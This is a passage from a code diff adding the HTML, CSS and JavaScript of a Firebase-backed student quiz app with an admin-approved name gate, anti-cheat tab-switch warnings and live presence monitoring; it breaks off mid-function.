+            line-height: 1.55;
+            margin-bottom: 16px;
+            word-wrap: break-word;
+        }
+
+        .q-image {
+            width: 100%;
+            max-height: 220px;
+            object-fit: contain;
+            border-radius: 14px;
+            margin-bottom: 14px;
+            display: block;
+            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .option-tile {
+            padding: 14px 16px;
+            border: 1.5px solid rgba(255, 255, 255, 0.09);
+            border-radius: 16px;
+            margin-bottom: 9px;
+            font-weight: 700;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.03);
+            transition: border-color 0.2s, background 0.2s;
+            gap: 12px;
+        }
+
+        .option-tile:active {
+            transform: scale(0.99);
+        }
+
+        .opt-letter {
+            width: 28px;
+            height: 28px;
+            border-radius: 9px;
+            flex-shrink: 0;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 900;
+            color: var(--muted);
+            transition: all 0.2s;
+        }
+
+        .option-tile span {
+            flex: 1;
+        }
+
+        .option-tile i {
+            font-size: 17px;
+            color: var(--muted);
+            flex-shrink: 0;
+        }
+
+        .option-tile.active {
+            border-color: var(--primary);
+            background: rgba(124, 109, 255, 0.12);
+        }
+
+        .option-tile.active .opt-letter {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: #fff;
+        }
+
+        .option-tile.active i {
+            color: var(--accent);
+        }
+
+        .submit-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 200;
+            padding: 13px 18px max(16px, env(safe-area-inset-bottom));
+            background: rgba(10, 9, 20, 0.97);
+            backdrop-filter: blur(16px);
+            border-top: 1px solid var(--border);
+        }
+
+        /* ══ RESULT PAGE ══ */
+        #resultPage {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .res-topbar {
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .icon-btn {
+            width: 42px;
+            height: 42px;
+            border-radius: 13px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid var(--border);
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .res-score-area {
+            padding: 24px 20px 18px;
+            text-align: center;
+            flex-shrink: 0;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .score-ring {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .score-ring::before {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--card);
+        }
+
+        #resScore {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--primary);
+            position: relative;
+            z-index: 1;
+        }
+
+        #scoreMsg {
+            font-size: 14px;
+            color: var(--muted);
+            font-weight: 700;
+        }
+
+        .res-chips {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        .res-chip {
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 800;
+            border: 1px solid;
+        }
+
+        .chip-c {
+            background: rgba(0, 212, 168, 0.1);
+            color: var(--green);
+            border-color: rgba(0, 212, 168, 0.25);
+        }
+
+        .chip-w {
+            background: rgba(255, 84, 112, 0.1);
+            color: var(--danger);
+            border-color: rgba(255, 84, 112, 0.25);
+        }
+
+        .chip-s {
+            background: rgba(255, 181, 71, 0.1);
+            color: var(--warning);
+            border-color: rgba(255, 181, 71, 0.25);
+        }
+
+        .filter-tabs {
+            display: flex;
+            gap: 8px;
+            padding: 10px 14px;
+            overflow-x: auto;
+            scrollbar-width: none;
+            flex-shrink: 0;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .filter-tabs::-webkit-scrollbar {
+            display: none;
+        }
+
+        .tab {
+            flex-shrink: 0;
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 800;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            color: var(--muted);
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .tab.active {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: #fff;
+        }
+
+        #reviewList {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 14px;
+            background: var(--bg);
+        }
+
+        .review-item {
+            padding: 18px;
+            border-radius: 20px;
+            margin-bottom: 12px;
+            border: 1px solid var(--border);
+            background: var(--card2);
+            width: 100%;
+            box-sizing: border-box;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        /* ══ HISTORY PAGE ══ */
+        #historyPage {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999;
+            flex-direction: column;
+        }
+
+        .hist-topbar {
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+        }
+
+        #historyList {
+            padding: 14px;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+
+        .history-card {
+            background: var(--card2);
+            border: 1px solid var(--border);
+            padding: 17px;
+            border-radius: 20px;
+            margin-bottom: 11px;
+            cursor: pointer;
+        }
+
+        .history-card:active {
+            border-color: rgba(124, 109, 255, 0.4);
+        }
+
+        /* ══ ABOUT ══ */
+        .ab-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 11px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--muted);
+        }
+
+        .ab-row:last-child {
+            border-bottom: none;
+        }
+
+        .ab-row i {
+            color: var(--accent);
+            width: 18px;
+            font-size: 14px;
+        }
+
+        .ab-row b {
+            color: var(--text);
+        }
+
+        /* ══ LEADERBOARD PAGE ══ */
+        #leaderboardPage {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999;
+            flex-direction: column;
+        }
+
+        .lb-topbar {
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+        }
+
+        #leaderboardList {
+            padding: 14px;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+
+        .lb-item {
+            background: var(--card2);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .lb-rank {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+
+        .lb-rank.gold {
+            background: rgba(255, 214, 10, 0.12);
+            border: 1px solid rgba(255, 214, 10, 0.3);
+            color: #ffd60a;
+        }
+
+        .lb-rank.silver {
+            background: rgba(200, 200, 200, 0.1);
+            border: 1px solid rgba(200, 200, 200, 0.2);
+            color: #ccc;
+        }
+
+        .lb-rank.bronze {
+            background: rgba(255, 107, 53, 0.1);
+            border: 1px solid rgba(255, 107, 53, 0.25);
+            color: #ff6b35;
+        }
+
+        .lb-rank.other {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border);
+            color: var(--muted);
+        }
+
+        .lb-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .lb-name {
+            font-weight: 700;
+            font-size: 15px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .lb-chapter {
+            font-size: 11px;
+            color: var(--muted);
+            font-weight: 600;
+            margin-top: 3px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .lb-score {
+            font-size: 22px;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 2px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="timerDisplay">⏱ 00:00</div>
+
+    <!-- ══ LOADING SCREEN ══ -->
+    <div id="loadingScreen">
+        <div class="loader-logo">🎓</div>
+        <div class="loader-title">CCMC Study Hub</div>
+        <div class="loader-sub">Elite Edition</div>
+        <div class="loader-bar-wrap">
+            <div class="loader-bar"></div>
+        </div>
+        <div class="loader-status" id="loaderStatus">Initializing...</div>
+    </div>
+
+    <!-- ══ ACCESS GATE ══ -->
+    <div id="accessGate">
+        <div class="gate-wrap">
+
+            <!-- SCREEN 1: Enter Name (only for truly new users) -->
+            <div class="gate-screen active" id="nameScreen">
+                <div class="gate-card">
+                    <div class="gate-icon">🎓</div>
+                    <div class="gate-title">Welcome!</div>
+                    <div class="gate-sub">Enter your full name to request access to CCMC Study Hub.</div>
+                    <span class="gate-label">Your Full Name</span>
+                    <input type="text" id="userNameInput" placeholder="e.g. Mohd Danish Ansari" onkeydown="if(event.key==='Enter')submitNameRequest()">
+                    <button class="action-btn" onclick="submitNameRequest()">REQUEST ACCESS →</button>
+                </div>
+            </div>
+
+            <!-- SCREEN 2: Pending approval -->
+            <div class="gate-screen" id="pendingScreen">
+                <div class="gate-card">
+                    <div class="pending-anim">⏳</div>
+                    <div class="gate-title">Request Sent!</div>
+                    <div class="pending-name-pill" id="pendingNamePill">—</div>
+                    <div class="gate-sub">Your access request has been sent to the admin. Please wait for approval.</div>
+                    <div class="pending-status-row">
+                        <i class="fa-solid fa-circle-dot"></i>
+                        <span id="pendingStatusText">Waiting for admin approval...</span>
+                    </div>
+                    <div class="pending-dots"><span></span><span></span><span></span></div>
+                    <button class="action-btn ghost" onclick="checkPendingStatus()">
+                        <i class="fa-solid fa-rotate" style="margin-right:6px;"></i>Check Status
+                    </button>
+                </div>
+            </div>
+
+            <!-- SCREEN 3: Blocked / Revoked -->
+            <div class="gate-screen" id="blockedScreen">
+                <div class="gate-card">
+                    <div class="blocked-anim">🚫</div>
+                    <div class="gate-title" style="color:var(--danger);">Access Denied</div>
+                    <div class="gate-sub" style="margin-bottom:16px;">Your access has been revoked by the admin. Please contact the administrator for help.</div>
+                    <div style="background:rgba(255,84,112,0.06);border:1px solid rgba(255,84,112,0.2);border-radius:14px;padding:11px 14px;display:flex;align-items:center;gap:10px;margin-bottom:18px;">
+                        <i class="fa-solid fa-shield-halved" style="color:var(--danger);font-size:16px;flex-shrink:0;"></i>
+                        <span style="font-size:12px;color:var(--muted);font-weight:700;line-height:1.4;">This decision was made by the system admin. Your data is safe.</span>
+                    </div>
+                    <button class="action-btn ghost" onclick="checkPendingStatus()">
+                        <i class="fa-solid fa-rotate" style="margin-right:6px;"></i>Check Status Again
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ══ SECURITY OVERLAY ══ -->
+    <div id="securityOverlay">
+        <div class="sec-card" id="secCard">
+            <div class="sec-banner">
+                <div class="sec-icon-wrap" id="secIcon">⚠️</div>
+                <div class="sec-banner-title" id="secBannerLabel">ANTI-CHEAT SYSTEM</div>
+            </div>
+            <div class="sec-body">
+                <div class="sec-warn-title">Warning <span id="secWarnNum">1</span></div>
+                <div class="sec-warn-sub" id="secWarnMsg">Tab switching detected! Stay on the quiz. Three violations will restart your attempt.</div>
+                <div class="warn-dots">
+                    <div class="warn-dot" id="dot1"></div>
+                    <div class="warn-dot" id="dot2"></div>
+                    <div class="warn-dot" id="dot3"></div>
+                </div>
+                <div class="sec-countdown-wrap">
+                    <i class="fa-solid fa-hourglass-half"></i>
+                    <span id="secCountdownText">Resuming in</span>
+                    <span id="secCountdownNum">3</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══ NOTIFY OVERLAY ══ -->
+    <div id="notifyOverlay" onclick="if(event.target.id==='notifyOverlay')this.style.display='none'">
+        <div class="notify-card" onclick="event.stopPropagation()">
+            <div class="sheet-handle"></div>
+            <div style="text-align:center;">
+                <div style="width:54px;height:54px;border-radius:18px;background:rgba(255,181,71,0.15);border:1px solid rgba(255,181,71,0.3);display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 14px;">🔔</div>
+                <div style="font-size:20px;font-weight:800;margin-bottom:8px;">Notice Board</div>
+                <p id="notifyText" style="color:var(--muted);font-size:14px;line-height:1.7;margin-bottom:20px;">Loading…</p>
+                <button class="action-btn" onclick="document.getElementById('notifyOverlay').style.display='none'">UNDERSTOOD</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══ ABOUT OVERLAY ══ -->
+    <div id="aboutOverlay" onclick="closeAbout(event)">
+        <div class="about-card" onclick="event.stopPropagation()">
+            <div class="sheet-handle"></div>
+            <div style="width:64px;height:64px;border-radius:20px;background:linear-gradient(135deg,var(--primary),var(--green));display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 16px;box-shadow:0 10px 28px rgba(124,109,255,0.4);">🎓</div>
+            <div style="text-align:center;margin-bottom:18px;">
+                <div style="font-size:21px;font-weight:800;">CCMC Hub <span style="color:var(--accent)">Elite</span></div>
+                <div style="font-size:13px;color:var(--muted);margin-top:4px;font-weight:600;">The Ultimate Study Companion</div>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:18px;padding:4px 16px;margin-bottom:20px;">
+                <div class="ab-row"><i class="fa-solid fa-user-tie"></i><span>Developer: <b>Mohd Danish Ansari</b></span></div>
+                <div class="ab-row"><i class="fa-solid fa-user-tie"></i><span>Contact: <b><a href="https://instagram.com/_danishansari_" target="_blank">Instagram</a></b></span></div>
+                <div class="ab-row"><i class="fa-solid fa-code-branch"></i><span>Version: <b>3.0.0 (Access Gate)</b></span></div>
+                <div class="ab-row"><i class="fa-solid fa-shield-virus"></i><span>Security: <b>Anti-Cheat + Access Control</b></span></div>
+                <div class="ab-row"><i class="fa-solid fa-database"></i><span>Backend: <b>Danish Ansari Server</b></span></div>
+            </div>
+            <button class="action-btn" onclick="document.getElementById('aboutOverlay').style.display='none'">CLOSE</button>
+        </div>
+    </div>
+
+    <!-- ══ HOME PAGE ══ -->
+    <div id="homePage">
+        <div class="header">
+            <h1>Manvendra Srivastava<br><span>Questions ✦</span></h1>
+            <div id="hiUser" style="margin-top:6px;">Hello!</div>
+        </div>
+        <div style="display:flex;gap:10px;padding:14px 14px 4px;margin-top:2px;">
+            <div style="flex:1;background:var(--card2);border:1px solid var(--border);border-radius:16px;padding:13px 10px;text-align:center;">
+                <div style="font-size:20px;font-weight:800;color:var(--accent);" id="statChaps">—</div>
+                <div style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:0.05em;margin-top:2px;">Chapters</div>
+            </div>
+            <div style="flex:1;background:var(--card2);border:1px solid var(--border);border-radius:16px;padding:13px 10px;text-align:center;">
+                <div style="font-size:20px;font-weight:800;color:var(--green);" id="statAttempts">—</div>
+                <div style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:0.05em;margin-top:2px;">Attempts</div>
+            </div>
+            <div style="flex:1;background:var(--card2);border:1px solid var(--border);border-radius:16px;padding:13px 10px;text-align:center;">
+                <div style="font-size:20px;font-weight:800;color:var(--warning);" id="statBest">—</div>
+                <div style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:0.05em;margin-top:2px;">Best</div>
+            </div>
+        </div>
+        <div style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);padding:14px 16px 10px;display:flex;align-items:center;gap:8px;">
+            All Chapters <div style="flex:1;height:1px;background:var(--border);"></div>
+        </div>
+        <div class="chapter-container" id="chapterList"></div>
+        <div class="bottom-bar">
+            <button class="bbar-btn hi" onclick="goHome()"><i class="fa-solid fa-house"></i>Home</button>
+            <button class="bbar-btn" onclick="showHistory()"><i class="fa-solid fa-clock-rotate-left"></i>History</button>
+            <button class="bbar-btn" onclick="document.getElementById('aboutOverlay').style.display='flex'"><i class="fa-solid fa-circle-info"></i>About</button>
+            <button class="bbar-btn" onclick="smartBack()"><i class="fa-solid fa-arrow-up-right-from-square"></i>Result</button>
+        </div>
+    </div>
+
+    <!-- ══ QUIZ PAGE ══ -->
+    <div id="quizPage">
+        <div class="quiz-topbar">
+            <button class="icon-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i></button>
+            <div class="quiz-title" id="currentTitle">Quiz</div>
+            <button class="sound-btn" id="soundToggleBtn" onclick="toggleSound()"><i class="fa-solid fa-volume-high" id="soundIcon"></i></button>
+            <div class="q-count-badge" id="qAnsweredBadge">0 / 0</div>
+        </div>
+        <div class="q-progress-wrap">
+            <div class="q-progress-track">
+                <div class="q-progress-fill" id="qProgressFill"></div>
+            </div>
+        </div>
+        <div id="questionsContainer"></div>
+        <div class="submit-bar">
+            <button class="action-btn green" onclick="finishQuiz()">
+                <i class="fa-solid fa-paper-plane" style="margin-right:8px;"></i>SUBMIT ASSESSMENT
+            </button>
+        </div>
+    </div>
+
+    <!-- ══ RESULT PAGE ══ -->
+    <div id="resultPage">
+        <div class="res-topbar">
+            <div class="icon-btn" onclick="goHome()"><i class="fa-solid fa-house"></i></div>
+            <div style="font-size:16px;font-weight:800;" id="resTitle">Result</div>
+            <div style="width:42px;"></div>
+        </div>
+        <div class="res-score-area">
+            <div class="score-ring">
+                <div id="resScore">0%</div>
+            </div>
+            <div id="scoreMsg">Keep going!</div>
+            <div class="res-chips">
+                <div class="res-chip chip-c" id="chipC">✓ 0</div>
+                <div class="res-chip chip-w" id="chipW">✗ 0</div>
+                <div class="res-chip chip-s" id="chipS">— 0</div>
+            </div>
+        </div>
+        <div class="filter-tabs">
+            <button class="tab active" onclick="filterResults('all',this)">All</button>
+            <button class="tab" onclick="filterResults('correct',this)">✓ Correct</button>
+            <button class="tab" onclick="filterResults('wrong',this)">✗ Wrong</button>
+            <button class="tab" onclick="filterResults('skipped',this)">— Skipped</button>
+        </div>
+        <div id="reviewList"></div>
+    </div>
+
+    <!-- ══ HISTORY PAGE ══ -->
+    <div id="historyPage">
+        <div class="hist-topbar">
+            <div class="icon-btn" onclick="goHome()"><i class="fa-solid fa-arrow-left"></i></div>
+            <div style="font-size:18px;font-weight:800;">My History</div>
+            <div class="icon-btn" onclick="clearHistory()" style="color:var(--danger);"><i class="fa-solid fa-trash-can"></i></div>
+        </div>
+        <div id="historyList"></div>
+    </div>
+
+    <!-- ══ LEADERBOARD PAGE ══ -->
+    <div id="leaderboardPage">
+        <div class="lb-topbar">
+            <div class="icon-btn" onclick="goHome()"><i class="fa-solid fa-arrow-left"></i></div>
+            <div style="font-size:18px;font-weight:800;">🏆 Leaderboard</div>
+            <div style="width:42px;"></div>
+        </div>
+        <div id="leaderboardList"></div>
+    </div>
+
+    <script>
+        // ══ FIREBASE INIT ══
+        const firebaseConfig = {
+            apiKey: "AIzaSyAX40dcdJ96TOhBgqa4bbIiOwLlUShnUI8",
+            databaseURL: "https://ccmc-90ba3-default-rtdb.firebaseio.com",
+            projectId: "ccmc-90ba3"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const LETTERS = ['A', 'B', 'C', 'D'];
+        let userName = '',
+            userAccessId = '',
+            accessApproved = false;
+        let activeQuiz = [],
+            userAnswers = [],
+            timerInterval, currentAnalysis = [];
+        let violationCount = 0,
+            isShowingWarning = false,
+            warnCountdownTimer = null;
+        let currentChapterId = '',
+            soundEnabled = true,
+            audioCtx = null;
+        let _pubRef = null;
+        let questionStartTime = 0;
+        let accessListener = null;
+
+        // ══ NORMALIZE NAME for matching ══
+        function normalizeName(n) {
+            return (n || '').toLowerCase().replace(/\s+/g, ' ').trim();
+        }
+
+        // ══ MAKE FIREBASE KEY from name ══
+        function nameToKey(n) {
+            return normalizeName(n).replace(/[^a-z0-9]/g, '_');
+        }
+
+        // ══ DEVICE INFO ══
+        function getDeviceInfo() {
+            const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+            const ua = navigator.userAgent;
+            const browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Other';
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                device: isMobile ? 'Mobile' : 'Desktop',
+                browser,
+                screenSize: window.screen.width + 'x' + window.screen.height,
+                network: conn ? (conn.effectiveType || conn.type || 'unknown') : 'unknown',
+                networkRtt: conn ? (conn.rtt || 0) : 0
+            };
+        }
+
+        // ══ SHOW GATE SCREEN ══
+        function showGateScreen(id) {
+            document.querySelectorAll('.gate-screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ══ MAIN ENTRY POINT ══
+        /* ══ LOADER ══ */
+        const _loaderMsgs = ['Initializing...', 'Connecting to server...', 'Verifying access...', 'Loading modules...', 'Almost ready...'];
+        let _loaderMsgIdx = 0;
+        const _loaderStatusEl = document.getElementById('loaderStatus');
+        const _loaderMsgTimer = setInterval(() => {
+            if (_loaderMsgIdx < _loaderMsgs.length - 1) {
+                _loaderMsgIdx++;
+                if (_loaderStatusEl) _loaderStatusEl.innerText = _loaderMsgs[_loaderMsgIdx];
+            }
+        }, 500);
+
+        function hideLoader(cb) {
+            clearInterval(_loaderMsgTimer);
+            if (_loaderStatusEl) _loaderStatusEl.innerText = 'Ready!';
+            setTimeout(() => {
+                const ls = document.getElementById('loadingScreen');
+                if (ls) {
+                    ls.classList.add('fade-out');
+                    setTimeout(() => {
+                        ls.style.display = 'none';
+                        if (cb) cb();
+                    }, 500);
+                } else {
+                    if (cb) cb();
+                }
+            }, 200);
+        }
+
+        window.onload = () => {
+            const savedName = localStorage.getItem('ccmc_user');
+            const savedId = localStorage.getItem('ccmc_access_id');
+
+            if (!savedName) {
+                // Truly new user — hide loader then show name screen
+                hideLoader(() => {
+                    document.getElementById('accessGate').style.display = 'flex';
+                    showGateScreen('nameScreen');
+                });
+                return;
+            }
+            // Has a saved name — check silently while loader shows
+            userName = savedName;
+            userAccessId = savedId || '';
+            checkAccessStatus();
+        };
+
+        // ══ CHECK ACCESS STATUS ══
+        function checkAccessStatus() {
+            const key = nameToKey(userName);
+            db.ref('user_access/' + key).once('value', snap => {
+                const data = snap.val();
+                if (!data) {
+                    autoSendRequest();
+                    return;
+                }
+                if (data.status === 'approved') {
+                    userAccessId = data.accessId || '';
+                    localStorage.setItem('ccmc_access_id', userAccessId);
+                    hideLoader(() => {
+                        grantAccess();
+                    });
+                } else if (data.status === 'pending') {
+                    hideLoader(() => {
+                        document.getElementById('accessGate').style.display = 'flex';
+                        showPendingScreen();
+                        listenForApproval(key);
+                    });
+                } else if (data.status === 'blocked') {
+                    hideLoader(() => {
+                        document.getElementById('accessGate').style.display = 'flex';
+                        showGateScreen('blockedScreen');
+                        listenForApproval(key); // still listen so unblock works
+                    });
+                } else {
+                    autoSendRequest();
+                }
+            });
+        }
+
+        // ══ AUTO SEND REQUEST (for old users who never had access record) ══
+        function autoSendRequest() {
+            const key = nameToKey(userName);
+            db.ref('user_access/' + key).set({
+                name: userName,
+                normalizedName: normalizeName(userName),
+                status: 'pending',
+                accessId: '',
+                requestedAt: Date.now(),
+                requestedAtStr: new Date().toLocaleString(),
+                isOldUser: true
+            }).then(() => {
+                hideLoader(() => {
+                    document.getElementById('accessGate').style.display = 'flex';
+                    showPendingScreen();
+                    listenForApproval(key);
+                });
+            });
+        }
+
+        // ══ SUBMIT NAME REQUEST (new user) ══
+        function submitNameRequest() {
+            const val = document.getElementById('userNameInput').value.trim();
+            if (val.length < 2) {
+                alert('Please enter your full name');
+                return;
+            }
+            userName = val;
+            localStorage.setItem('ccmc_user', userName);
+
+            const key = nameToKey(userName);
+            // Check if already has a record
+            db.ref('user_access/' + key).once('value', snap => {
+                const data = snap.val();
+                if (data && data.status === 'approved') {
+                    userAccessId = data.accessId || '';
+                    localStorage.setItem('ccmc_access_id', userAccessId);
+                    grantAccess();
+                    return;
+                }
+                if (data && data.status === 'pending') {
+                    showPendingScreen();
+                    listenForApproval(key);
+                    return;
+                }
+                if (data && data.status === 'blocked') {
+                    showGateScreen('blockedScreen');
+                    return;
+                }
+                // New request
+                db.ref('user_access/' + key).set({
+                    name: userName,
+                    normalizedName: normalizeName(userName),
+                    status: 'pending',
+                    accessId: '',
+                    requestedAt: Date.now(),
+                    requestedAtStr: new Date().toLocaleString(),
+                    isOldUser: false
+                }).then(() => {
+                    showPendingScreen();
+                    listenForApproval(key);
+                });
+            });
+        }
+
+        // ══ SHOW PENDING SCREEN ══
+        function showPendingScreen() {
+            document.getElementById('pendingNamePill').innerText = userName;
+            document.getElementById('pendingStatusText').innerText = 'Waiting for admin approval...';
+            showGateScreen('pendingScreen');
+        }
+
+        // ══ LISTEN FOR APPROVAL in real-time ══
+        function listenForApproval(key) {
+            // Detach old listener first
+            if (accessListener) {
+                db.ref('user_access/' + key + '/status').off('value', accessListener);
+                accessListener = null;
+            }
+            let _firstRun = true; // skip initial value (we already handled it)
+            accessListener = function(snap) {
+                const status = snap.val();
+                if (!status) return;
+                if (_firstRun) {
+                    _firstRun = false;
+                    return;
+                } // skip first fire
+                // ── APPROVED ──
+                if (status === 'approved') {
+                    db.ref('user_access/' + key + '/accessId').once('value', idSnap => {
+                        userAccessId = idSnap.val() || '';
+                        localStorage.setItem('ccmc_access_id', userAccessId);
+                        const gate = document.getElementById('accessGate');
+                        if (gate && gate.style.display !== 'none') {
+                            // Coming from pending/blocked screen
+                            gate.style.display = 'none';
+                            grantAccess();
+                        }
+                        // If already in app (re-approved after block), just refresh
+                    });
+                }
+                // ── BLOCKED ── (works whether user is in app or on pending screen)
+                else if (status === 'blocked') {
+                    const gate = document.getElementById('accessGate');
+                    if (!gate || gate.style.display === 'none') {
+                        // User is inside the app — force logout immediately
+                        forceLogout();
+                    } else {
+                        showGateScreen('blockedScreen');
+                    }
+                }
+                // ── PENDING (unblocked but not yet approved) ──
+                else if (status === 'pending') {
+                    const gate = document.getElementById('accessGate');
+                    if (!gate || gate.style.display === 'none') {
+                        forceLogout();
+                    } else {
+                        document.getElementById('accessGate').style.display = 'flex';
+                        showGateScreen('pendingScreen');
+                    }
+                }
+            };
+            db.ref('user_access/' + key + '/status').on('value', accessListener);
+        }
+
+        // ══ MANUAL CHECK ══
+        function checkPendingStatus() {
+            document.getElementById('pendingStatusText').innerText = 'Checking...';
+            checkAccessStatus();
+        }
+
+        // ══ GRANT ACCESS → enter app ══
+        function grantAccess() {
+            // Make sure gate is hidden
+            const gate = document.getElementById('accessGate');
+            if (gate) gate.style.display = 'none';
+            const h = new Date().getHours();
+            const g = h < 12 ? 'Good Morning' : h < 17 ? 'Good Afternoon' : 'Good Evening';
+            document.getElementById('hiUser').innerText = g + ', ' + userName.split(' ')[0] + '! 👋';
+            document.getElementById('homePage').style.display = 'block';
+            loadChapters();
+            loadStats();
+            listenForNotifications();
+            registerPublicPresence();
+            // Start permanent block/unblock listener (keeps working forever while app is open)
+            startBlockListener();
+        }
+
+        // ══ PERMANENT BLOCK LISTENER — completely separate from approval flow ══
+        let _blockListenerRef = null;
+
+        function startBlockListener() {
+            const key = nameToKey(userName);
+            if (_blockListenerRef) {
+                db.ref('user_access/' + key + '/status').off('value', _blockListenerRef);
+            }
+            _blockListenerRef = function(snap) {
+                const status = snap.val();
+                if (!status) return;
+                if (status === 'blocked') {
+                    forceLogout();
+                } else if (status === 'approved') {
+                    // Already in app and re-approved — do nothing
+                }
+            };
+            db.ref('user_access/' + key + '/status').on('value', _blockListenerRef);
+        }
+
+        // ══ FORCE LOGOUT if blocked while in app ══
+        function forceLogout() {
+            removePublicPresence();
+            clearInterval(timerInterval);
+            document.getElementById('timerDisplay').style.display = 'none';
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('quizPage').style.display = 'none';
+            document.getElementById('resultPage').style.display = 'none';
+            document.getElementById('historyPage').style.display = 'none';
+            document.getElementById('leaderboardPage').style.display = 'none';
+            document.getElementById('accessGate').style.display = 'flex';
+            showGateScreen('blockedScreen');
+        }
+
+        // ══ PRESENCE + ADMIN SYSTEM ══
+        function registerPublicPresence() {
+            if (!userName) return;
+            const _key = nameToKey(userName);
+            _pubRef = db.ref('public_live/' + _key);
+            const di = getDeviceInfo();
+            _pubRef.set({
+                name: userName,
+                accessId: userAccessId,
+                joinedAt: Date.now(),
+                page: 'Home Screen',
+                lastAction: 'App Launched',
+                violations: 0,
+                liveCorrect: 0,
+                liveWrong: 0,
+                isBanned: false,
+                device: di.device,
+                browser: di.browser,
+                screenSize: di.screenSize,
+                network: di.network,
+                networkRtt: di.networkRtt,
+                idleStatus: 'ACTIVE',
+                scrollPct: 0
+            });
+            _pubRef.onDisconnect().remove();
+            listenForAdminSystem();
+            startMonitoring();
+        }
+
+        function removePublicPresence() {
+            if (_pubRef) {
+                _pubRef.onDisconnect().cancel();
+                _pubRef.remove();
+            }
+        }
+
+        function startMonitoring() {
+            if (!_pubRef) return;
+            let _idleTimer = null;
+
+            function resetIdle() {
+                clearTimeout(_idleTimer);
+                _pubRef.update({
+                    idleStatus: 'ACTIVE'
+                });
+                _idleTimer = setTimeout(() => {
+                    if (_pubRef) _pubRef.update({
+                        idleStatus: 'IDLE_60s'
+                    });
+                }, 60000);
+            }
+            ['touchstart', 'touchmove', 'click', 'keydown', 'scroll'].forEach(ev => {
